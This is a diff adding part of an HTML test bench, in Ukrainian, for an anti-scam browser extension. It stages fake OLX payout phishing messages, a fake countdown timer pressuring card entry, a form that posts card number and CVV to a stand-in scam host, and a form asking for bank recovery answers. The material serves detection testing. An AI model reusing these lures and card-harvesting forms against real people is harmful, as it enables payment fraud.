+                <button type="button" id="fillDecoysManualBtn" class="reddit-btn" style="background: #e8f5e9; color: #166534; border-color: #86efac;">🧪 Ручна підстановка Canary Decoys</button>
+                <button type="button" id="resetVaultFormBtn" class="reddit-btn">🔄 Очистити форму</button>
+              </div>
+            </form>
+            <div id="vaultFormStatus" class="status-toast success">Форму відправлено з підставленими Canary-значеннями або після усвідомленого підтвердження!</div>
+          </div>
+
+          <div class="expando-box">
+            <strong>Як перевірити:</strong>
+            <ol style="padding-left: 16px; margin: 4px 0;">
+              <li>Натисніть <strong>«Підтвердити особу та отримати кошти»</strong>.</li>
+              <li>Розширення зафіксує витік персональних маркерів відновлення банку та виведе модальне вікно.</li>
+              <li>У вікні доступна зелена кнопка <strong>«Підставити безпечні дані (Canary Decoy)»</strong>.</li>
+              <li>Натисніть її: всі поля форми автоматично заміняться на безпечні декої (<em>«Оксана»</em>, <em>«Дніпро»</em>, <em>«2987654321»</em>, <em>«АА 654321»</em> тощо) без розкриття реальних маркерів!</li>
+              <li>Спробуйте кнопку <strong>«🇬🇧 Заповнити EN»</strong>, щоб перевірити тримовне розпізнавання англійських лейблів (<em>«Mother's maiden name»</em>, <em>«Tax ID»</em>, <em>«Codeword»</em>).</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+      <!-- ===================================================================
+           МЕТОД 8: ШТУЧНЕ НАГНІТАННЯ ТЕРМІНОВОСТІ (FAKE TIMER & DARK PATTERNS)
+           =================================================================== -->
+      <div class="reddit-post" id="test8">
+        <div class="vote-box">
+          <span class="vote-arrow">▲</span>
+          <span class="post-score high">96</span>
+          <span class="vote-arrow">▼</span>
+        </div>
+        <div class="post-body">
+          <div class="post-title-line">
+            <span class="post-tag tag-heuristic" style="background: #fef3c7; color: #b45309; border-color: #fde68a;">Етап 8</span>
+            <a href="#test8" class="post-title">Метод 8: Детекція маніпулятивних інтерфейсів (Fake Countdown Timer & Urgency Pressure Dark Patterns)</a>
+          </div>
+          <div class="post-meta">
+            автор: <a href="#">urgency_detector</a> | тригер: <code>urgency_scarcity_manipulation</code> (+20), <code>form_action_mismatch</code> (+45)
+          </div>
+          <div class="post-desc">
+            Шахрайські лендінги розміщують динамічні таймери зворотного відліку та тексти психологічного тиску (<em>«кошти будуть повернуті відправнику через 04:59»</em>, <em>«до анулювання виплати залишилось...»</em>), щоб штучно викликати паніку та примусити користувача ввести карткові реквізити без належної перевірки домену. Детектор виявляє активний таймер у DOM та додає <strong>+20 балів</strong> до технічного ризику форми.
+          </div>
+
+          <div class="interactive-panel">
+            <!-- БАНЕР ПСИХОЛОГІЧНОГО ТИСКУ З ТАЙМЕРОМ -->
+            <div style="background: #fff1f2; border: 1px solid #fecdd3; border-radius: 4px; padding: 8px 12px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; gap: 8px; flex-wrap: wrap;">
+              <div style="font-size: 11.5px; font-weight: bold; color: #be123c;">
+                ⏳ УВАГА: До скасування виплати 1 450 грн та повернення коштів покупцю залишилось:
+              </div>
+              <div id="fakeTimerBadge" class="countdown-timer" style="background: #e11d48; color: #ffffff; font-family: ui-monospace, SFMono-Regular, monospace; font-size: 13px; font-weight: bold; padding: 3px 8px; border-radius: 4px; letter-spacing: 0.05em;">
+                04:59
+              </div>
+            </div>
+
+            <form id="urgencyScamForm" action="https://fake-urgent-payout.scam/claim" method="POST" class="reddit-form">
+              <label style="font-weight: bold;">Номер банківської картки для негайного зарахування:</label>
+              <input type="text" id="urgencyCard" name="cardNumber" class="reddit-input" placeholder="16 цифр картки" value="4532015000000007">
+              <div class="form-row">
+                <input type="text" class="reddit-input" placeholder="ММ/РР" value="09/27" style="width: 90px;">
+                <input type="password" class="reddit-input" placeholder="CVV" value="888" style="width: 70px;">
+                <button type="submit" class="reddit-btn reddit-btn-primary">Негайно підтвердити отримання коштів (1 450 грн)</button>
+              </div>
+
+              <div style="display: flex; gap: 6px; margin-top: 6px;">
+                <button type="button" id="toggleTimerBtn" class="reddit-btn">⏸️ Зупинити таймер</button>
+                <button type="button" id="resetTimerBtn" class="reddit-btn">🔄 Скинути таймер (04:59)</button>
+              </div>
+            </form>
+            <div id="urgencyFormStatus" class="status-toast success">Форму відправлено після вашого усвідомленого підтвердження!</div>
+          </div>
+
+          <div class="expando-box">
+            <strong>Як перевірити:</strong>
+            <ol style="padding-left: 16px; margin: 4px 0;">
+              <li>Зверніть увагу: таймер зверху форми цокає в реальному часі кожну секунду (<code>04:59</code>, <code>04:58</code>...).</li>
+              <li>Натисніть <strong>«Негайно підтвердити отримання коштів»</strong>.</li>
+              <li>Розширення просканує DOM, виявить наявність таймера та тексту психологічного тиску (+20 балів) і заблокує форму.</li>
+              <li>У каруселі модального вікна з'явиться спеціальна картка <em>«Штучне нагнітання терміновості (Dark Pattern)»</em> із зазначенням зворотного відліку.</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- ПРАВА КОЛОНКА (REDDIT SIDEBAR) -->
+    <div class="sidebar">
+
+      <!-- БЛОК СТАНУ РОЗШИРЕННЯ -->
+      <div class="side-box">
+        <h3 class="side-title">Стан розширення</h3>
+        <span id="extStatusBadge" class="ext-badge inactive">
+          Перевірка зв'язку з розширенням...
+        </span>
+        <div style="font-size: 11px; color: #666666; line-height: 1.4;">
+          Для роботи з локальними HTML-файлами відкрийте <code>chrome://extensions</code> та увімкніть опцію <strong>«Дозволити доступ до файлових URL-адрес»</strong>.
+        </div>
+      </div>
+
+      <!-- КЕРУВАННЯ КОНТЕКСТОМ ТА БІЛИМ СПИСКОМ -->
+      <div class="side-box">
+        <h3 class="side-title">Керування станом</h3>
+        <button type="button" id="resetUserWhitelistBtn" class="side-btn">
+          🗑️ Очистити Whitelist користувача
+        </button>
+        <button type="button" id="sideResetContextBtn" class="side-btn">
+          🔄 Скинути Tainted Context Window
+        </button>
+      </div>
+
+      <!-- МАТЕМАТИЧНА МОДЕЛЬ (ДЛЯ ДИПЛОМА) -->
+      <div class="side-box">
+        <h3 class="side-title">Математична модель XAI</h3>
+        <div style="font-size: 11px; color: #444444;">
+          Адитивна оцінка загрози:
+          <div class="formula-math">RiskScore = min(100, Σ w_i + C_env)</div>
+          <strong>Компоненти:</strong>
+          <ul style="padding-left: 16px; margin: 4px 0;">
+            <li><code>R_tech</code>: евристики форми (0–60)</li>
+            <li><code>C_env</code>: контекст сесії (0–35)</li>
+            <li><code>A_user</code>: намір дії (0–45)</li>
+          </ul>
+          <strong>Рівні ризику:</strong>
+          <div style="font-size: 10px; color: #666666; margin-top: 4px;">
+            CRITICAL (≥75) • HIGH (50–74) • MEDIUM (25–49) • LOW (&lt;25)
+          </div>
+        </div>
+      </div>
+
+      <!-- ПРАВИЛА БЕЗПЕКИ -->
+      <div class="side-box">
+        <h3 class="side-title">Архітектурні принципи</h3>
+        <ol style="padding-left: 16px; margin: 4px 0; font-size: 11px; color: #444444; line-height: 1.45;">
+          <li><strong>Clean Zen:</strong> жодного забруднення DOM сайту.</li>
+          <li><strong>Apple HIG:</strong> спокійна мова, без емодзі та паніки.</li>
+          <li><strong>On-Device:</strong> 100% локальна обробка без хмарних API.</li>
+          <li><strong>Inbound != Outbound:</strong> точне розмежування напрямків реплік.</li>
+        </ol>
+      </div>
+
+    </div>
+
+  </div>
+
+  <!-- =========================================================================
+       JAVASCRIPT ЛОГІКА ТЕСТОВОГО СТЕНДУ
+       ========================================================================= -->
+  <script>
+    // 1. Обробник легітимного сабміту LiqPay
+    document.getElementById('liqpayForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const st = document.getElementById('liqpayStatus');
+      st.style.display = 'block';
+    });
+
+    // 2. Обробник сабміту невідомого мерчанта (спрацьовує лише після схвалення модалкою)
+    document.getElementById('untrustedPaymentForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const st = document.getElementById('untrustedStatus');
+      st.style.display = 'block';
+    });
+
+    // 3. Обробник форми з прихованими полями
+    document.getElementById('hiddenInputsForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const st = document.getElementById('hiddenFormStatus');
+      st.style.display = 'block';
+    });
+
+    // Очищення полів форми
+    document.getElementById('clearUntrustedBtn').addEventListener('click', () => {
+      document.getElementById('untrustedCard').value = '';
+      document.getElementById('untrustedExp').value = '';
+      document.getElementById('untrustedCvv').value = '';
+      alert('Поля очищено. Оскільки карткових даних немає, форма пройде без блокувань!');
+    });
+
+    // 4. Події чату (Outbound Draft)
+    document.getElementById('pasteTestCardBtn').addEventListener('click', () => {
+      const chatInput = document.getElementById('chatInput');
+      chatInput.value = 'Ось мій номер картки: 4532 0150 0000 0007 для отримання коштів';
+      chatInput.dispatchEvent(new Event('input', { bubbles: true }));
+    });
+
+    document.getElementById('pasteTestCvvBtn').addEventListener('click', () => {
+      const chatInput = document.getElementById('chatInput');
+      chatInput.value = 'Ось мій захисний код: cvv 999';
+      chatInput.dispatchEvent(new Event('input', { bubbles: true }));
+    });
+
+    document.getElementById('sendChatBtn').addEventListener('click', () => {
+      const chatInput = document.getElementById('chatInput');
+      chatInput.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
+    });
+
+    document.getElementById('chatInput').addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') {
+        const st = document.getElementById('chatSentStatus');
+        st.style.display = 'block';
+      }
+    });
+
+    // 5. Симуляція додавання нових повідомлень (Live MutationObserver)
+    document.getElementById('simulateBotPhishingBtn').addEventListener('click', () => {
+      const list = document.getElementById('chatMessagesList');
+      const div = document.createElement('div');
+      div.className = 'chat-msg incoming css-1vu76it';
+      div.setAttribute('data-testid', 'received-message');
+      div.setAttribute('data-cy', 'received-message');
+      div.setAttribute('data-nx-name', 'ReceivedChatMessage');
+      div.setAttribute('aria-label', 'Повідомлення, надіслане системою');
+      div.style.cssText = 'background: #ffffff; border: 1px solid #c4c4c4; border-radius: 3px; padding: 8px 10px; max-width: 85%;';
+      div.innerHTML = `
+        <div style="font-size: 10px; font-weight: bold; color: #555555; margin-bottom: 2px;">Служба OLX • ReceivedChatMessage</div>
+        <div data-testid="message" data-cy="chat-message-bubble" class="css-gvo1jg" style="font-size: 12px; color: #111111; line-height: 1.45;">
+          <span data-nx-name="TextContainer" data-nx-legacy="true" class="css-13qnph1">
+            Інформація про замовлення:<br>
+            Найменування товару: Бавовняна рубашка H&M (S)<br>
+            Сума до отримання 600 грн.<br><br>
+            Будь ласка, зверніть увагу: оскільки це ваша перша угода через «OLX Доставка», для завершення операції потрібно пройти додаткову перевірку профілю.<br><br>
+            Що потрібно зробити:<br>
+            Виділіть посилання -t.me/OLXHelpProtect_bot<br>
+            Вставте її у свій браузер або натисніть «Перейти» одразу з меню, що з'явилося. Дотримуйтесь інструкцій бота та завершіть миттєву перевірку даних.<br><br>
+            Доки перевірка не буде завершена, замовлення залишатиметься у статусі очікування.<br>
+            Дякуємо, що обираєте OLX
+          </span>
+        </div>
+      `;
+      list.appendChild(div);
+    });
+
+    document.getElementById('simulateInboundLureBtn').addEventListener('click', () => {
+      const list = document.getElementById('chatMessagesList');
+      const div = document.createElement('div');
+      div.className = 'chat-msg incoming css-1vu76it';
+      div.setAttribute('data-testid', 'received-message');
+      div.setAttribute('data-cy', 'received-message');
+      div.setAttribute('data-nx-name', 'ReceivedChatMessage');
+      div.setAttribute('aria-label', 'Повідомлення, надіслане покупцем');
+      div.style.cssText = 'background: #ffffff; border: 1px solid #c4c4c4; border-radius: 3px; padding: 8px 10px; max-width: 85%;';
+      div.innerHTML = `
+        <div style="font-size: 10px; font-weight: bold; color: #555555; margin-bottom: 2px;">Покупець • OLX ReceivedChatMessage</div>
+        <div data-testid="message" data-cy="chat-message-bubble" class="css-gvo1jg" style="font-size: 12px; color: #111111; line-height: 1.45;">
+          <span data-nx-name="TextContainer" data-nx-legacy="true" class="css-13qnph1">
+            Я вже оплатив замовлення через OLX Доставку! Перейдіть за посиланням для отримання коштів: <a href="https://olx-secure-payout.fake/receive" style="color: #0000ff; text-decoration: underline;">https://olx-secure-payout.fake/receive</a>
+          </span>
+        </div>
+      `;
+      list.appendChild(div);
+    });
+
+    document.getElementById('simulateInboundCardBtn').addEventListener('click', () => {
+      const list = document.getElementById('chatMessagesList');
+      const div = document.createElement('div');
+      div.className = 'chat-msg incoming css-1vu76it';
+      div.setAttribute('data-testid', 'received-message');
+      div.setAttribute('data-cy', 'received-message');
+      div.setAttribute('data-nx-name', 'ReceivedChatMessage');
+      div.setAttribute('aria-label', 'Повідомлення, надіслане продавцем');
+      div.style.cssText = 'background: #ffffff; border: 1px solid #c4c4c4; border-radius: 3px; padding: 8px 10px; max-width: 85%;';
+      div.innerHTML = `
+        <div style="font-size: 10px; font-weight: bold; color: #555555; margin-bottom: 2px;">Співрозмовник • OLX ReceivedChatMessage</div>
+        <div data-testid="message" data-cy="chat-message-bubble" class="css-gvo1jg" style="font-size: 12px; color: #111111; line-height: 1.45;">
+          <span data-nx-name="TextContainer" data-nx-legacy="true" class="css-13qnph1">
+            Ось номер моєї картки для сплати: <strong>5168 7556 1234 5678</strong>.
+          </span>
+        </div>
+        <div style="font-size: 10px; color: #2e7d32; margin-top: 4px; font-weight: bold;">
+          • Вхідна картка не є витоком власних даних: 0 помилкових тривог!
+        </div>
+      `;
+      list.appendChild(div);
+    });
+
+    // 5.1 Обробники для Методу 7 (Personal Data Vault: 7 об'єктів та тримовне розпізнавання)
+    document.getElementById('vaultScamForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const st = document.getElementById('vaultFormStatus');
+      st.style.display = 'block';
+    });
+
+    const setVaultValues = (vals) => {
+      if (document.getElementById('vaultInputMother')) document.getElementById('vaultInputMother').value = vals.mother || '';
+      if (document.getElementById('vaultInputSecretWord')) document.getElementById('vaultInputSecretWord').value = vals.secretWord || '';
+      if (document.getElementById('vaultInputTaxId')) document.getElementById('vaultInputTaxId').value = vals.taxId || '';
+      if (document.getElementById('vaultInputPassport')) document.getElementById('vaultInputPassport').value = vals.passport || '';
+      if (document.getElementById('vaultInputDob')) document.getElementById('vaultInputDob').value = vals.dob || '';
+      if (document.getElementById('vaultInputPhone')) document.getElementById('vaultInputPhone').value = vals.phone || '';
+      if (document.getElementById('vaultInputFather')) document.getElementById('vaultInputFather').value = vals.father || '';
+    };
+
+    document.getElementById('fillVaultUkBtn')?.addEventListener('click', () => {
+      document.getElementById('lblVaultMother').innerText = '1. Дівоче прізвище матері [Tier A — абсолютний маркер]:';
+      document.getElementById('lblVaultSecretWord').innerText = '2. Секретне / Кодове слово банку [Tier A — абсолютний маркер]:';
+      document.getElementById('lblVaultTaxId').innerText = '3. РНОКПП / ІПН (Податковий номер) [Tier B]:';
+      document.getElementById('lblVaultPassport').innerText = '4. Номер паспорта / ID-картки [Tier B]:';
+      document.getElementById('lblVaultDob').innerText = '5. Дата народження [Tier B]:';
+      document.getElementById('lblVaultPhone').innerText = '6. Фінансовий номер телефону [Tier B]:';
+      document.getElementById('lblVaultFather').innerText = "7. Ім'я батька / По батькові [Tier B]:";
+
+      setVaultValues({
+        mother: 'Людмила',
+        secretWord: 'Калина',
+        taxId: '3124567890',
+        passport: 'АА 123456',
+        dob: '15.08.1985',
+        phone: '+380501234567',
+        father: 'Лео'
+      });
+      alert('Заповнено реальними українськими даними зі сховища!');
+    });
+
+    document.getElementById('fillVaultEnBtn')?.addEventListener('click', () => {
+      document.getElementById('lblVaultMother').innerText = "1. Mother's maiden name [Tier A — absolute security token]:";
+      document.getElementById('lblVaultSecretWord').innerText = '2. Bank secret codeword / Passphrase [Tier A]:';
+      document.getElementById('lblVaultTaxId').innerText = '3. National Tax ID / SSN [Tier B]:';
+      document.getElementById('lblVaultPassport').innerText = '4. Passport / National ID card number [Tier B]:';
+      document.getElementById('lblVaultDob').innerText = '5. Date of birth (DOB) [Tier B]:';
+      document.getElementById('lblVaultPhone').innerText = '6. Financial phone number [Tier B]:';
+      document.getElementById('lblVaultFather').innerText = "7. Father's name / Middle name [Tier B]:";
+
+      setVaultValues({
+        mother: 'Людмила',
+        secretWord: 'Калина',
+        taxId: '3124567890',
+        passport: 'АА 123456',
+        dob: '15.08.1985',
+        phone: '+380501234567',
+        father: 'Лео'
+      });
+      alert('Форму переключено на англійські мітки (EN Context Recognition)!');
+    });
+
+    document.getElementById('fillDecoysManualBtn')?.addEventListener('click', () => {
+      setVaultValues({
+        mother: 'Оксана',
+        secretWord: 'Дніпро',
+        taxId: '2987654321',
+        passport: 'АА 654321',
+        dob: '01.01.1990',
+        phone: '+380679876543',
+        father: 'Олександр'
+      });
+      alert('Всі 7 полів замінено на безпечні декої (Canary Decoys)!');
+    });
+
+    document.getElementById('resetVaultFormBtn')?.addEventListener('click', () => {
+      setVaultValues({
+        mother: '',
+        secretWord: '',
+        taxId: '',
+        passport: '',
+        dob: '',
+        phone: '',
+        father: ''
+      });
+    });
+
+    // 5.2 Обробники для Методу 8 (Fake Countdown Timer & Urgency Pressure)
+    let fakeTimerSeconds = 299; // 04:59
+    let fakeTimerInterval = null;
+    const timerBadge = document.getElementById('fakeTimerBadge');
+    const toggleTimerBtn = document.getElementById('toggleTimerBtn');
+
+    function formatTime(sec) {
+      const m = Math.floor(sec / 60);
+      const s = sec % 60;
+      return `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+    }
+
+    function startTimer() {
+      if (fakeTimerInterval) clearInterval(fakeTimerInterval);
+      fakeTimerInterval = setInterval(() => {
+        if (fakeTimerSeconds > 0) {
+          fakeTimerSeconds--;
+          if (timerBadge) timerBadge.innerText = formatTime(fakeTimerSeconds);
+        } else {
+          clearInterval(fakeTimerInterval);
+          fakeTimerInterval = null;
+          if (timerBadge) timerBadge.innerText = '00:00';
+        }
+      }, 1000);
+    }
+
+    startTimer();
+
+    if (toggleTimerBtn) {
+      toggleTimerBtn.addEventListener('click', () => {
+        if (fakeTimerInterval) {
+          clearInterval(fakeTimerInterval);
+          fakeTimerInterval = null;
+          toggleTimerBtn.innerText = '▶️ Запустити таймер';
+        } else {
+          startTimer();
+          toggleTimerBtn.innerText = '⏸️ Зупинити таймер';
+        }
+      });
+    }
+
+    document.getElementById('resetTimerBtn')?.addEventListener('click', () => {
+      fakeTimerSeconds = 299;
+      if (timerBadge) timerBadge.innerText = '04:59';
+      startTimer();
+      if (toggleTimerBtn) toggleTimerBtn.innerText = '⏸️ Зупинити таймер';
+    });
+
+    document.getElementById('urgencyScamForm')?.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const st = document.getElementById('urgencyFormStatus');
+      if (st) st.style.display = 'block';
+    });
+
+    // 6. Зв'язок з розширенням через window.postMessage
+    let isExtensionActive = false;
+
+    function updateBadge(active, version) {
+      const badge = document.getElementById('extStatusBadge');
+      if (!badge) return;
+      if (active) {
+        badge.className = 'ext-badge active';
+        badge.innerText = `Розширення активне (v${version || '0.2.0'})`;
+      } else {
+        badge.className = 'ext-badge inactive';
+        badge.innerText = 'Розширення не виявлено';
+      }
+    }
+
+    window.addEventListener('message', (e) => {
+      if (!e.data || typeof e.data !== 'object') return;
+
+      if (e.data.type === 'THREAT_SHIELD_READY' || e.data.type === 'THREAT_SHIELD_PONG') {
+        isExtensionActive = true;
+        updateBadge(true, e.data.version);
+      }
+
+      if (e.data.type === 'THREAT_SHIELD_WHITELIST_CLEARED') {
+        alert('Персональний білий список успішно очищено!');
+      }
+
+      if (e.data.type === 'THREAT_SHIELD_CONTEXT_CLEARED') {
+        const toast = document.getElementById('lureTriggeredToast');
+        if (toast) toast.style.display = 'none';
+        alert('Tainted Context Window успішно очищено!');
+      }
+
+      if (e.data.type === 'THREAT_SHIELD_LURE_TRIGGERED') {
+        const toast = document.getElementById('lureTriggeredToast');
+        if (toast) toast.style.display = 'block';
+      }
+    });
+
+    const checkExtension = () => {
+      if (document.documentElement.getAttribute('data-threat-shield-loaded') === 'true') {
+        isExtensionActive = true;
+        updateBadge(true, '0.2.0');
+      }
+      window.postMessage({ type: 'THREAT_SHIELD_PING' }, '*');
+    };
+
+    checkExtension();
+    setTimeout(checkExtension, 400);
+    setTimeout(() => {
+      if (!isExtensionActive) updateBadge(false);
+    }, 1200);
+
+    // Кнопки взаємодії зі станом
+    document.getElementById('triggerLureBtn').addEventListener('click', () => {
+      window.postMessage({
+        type: 'THREAT_SHIELD_TRIGGER_LURE',
+        platform: 'olx.ua',
+        keywords: ['olx доставка', 'отримати кошти замовлення', 'підтвердити виплату'],
+        suspiciousUrl: 'https://novaposhta-pay.fake.com/order123'
+      }, '*');
+    });
+
+    const handleClearContext = () => {
+      window.postMessage({ type: 'THREAT_SHIELD_CLEAR_CONTEXT' }, '*');
+    };
+    document.getElementById('resetContextBtn').addEventListener('click', handleClearContext);
+    document.getElementById('sideResetContextBtn').addEventListener('click', handleClearContext);
+
+    document.getElementById('resetUserWhitelistBtn').addEventListener('click', () => {
+      window.postMessage({ type: 'THREAT_SHIELD_CLEAR_WHITELIST' }, '*');
+    });
+  </script>
+</body>
+</html>
